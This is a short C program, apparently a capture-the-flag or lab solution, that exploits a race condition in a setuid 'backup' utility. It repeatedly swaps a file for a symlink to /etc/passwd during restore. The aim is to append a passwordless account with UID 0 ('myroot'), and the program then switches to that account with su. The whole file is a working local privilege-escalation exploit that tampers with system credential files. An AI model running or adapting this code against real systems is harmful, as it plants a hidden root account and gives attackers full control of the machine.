#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define TARGET "/usr/local/bin/backup" // or backupV2

int countline() {
	int lines = 0;
	int ch = 0;
	FILE *f = fopen("/etc/passwd", "r");
	if (f == NULL) return 0;
	while ((ch = fgetc(f)) != EOF) {
		if (ch == '\n') lines++;
	}
	fclose(f);
	return lines;
}
int main(void)
{
	int pid, i, j, n;

	system("cat /etc/passwd > passwd");
	system("echo 'myroot::0:0:root:/root:/bin/bash' >> passwd");
	system("backup backup passwd");
	remove("passwd");
	printf("please wait for 30s\n");
	n = countline();
	sleep(1);
	while (1) {
		pid = fork();
		if (pid == 0) {
			for (i = 0; i < 20; i++) {
				usleep((rand()%5 + 1) * 1000);
				remove("passwd");
				symlink("/etc/passwd", "passwd");
			}
			return 0;
		} else {
			for (i = 0; i < 20; i ++) {
				system("backup restore passwd 2> /dev/null");
				remove("passwd");
			}
		}
		if (countline() != n) break;
	}
	system("su myroot");
	exit(0);
}

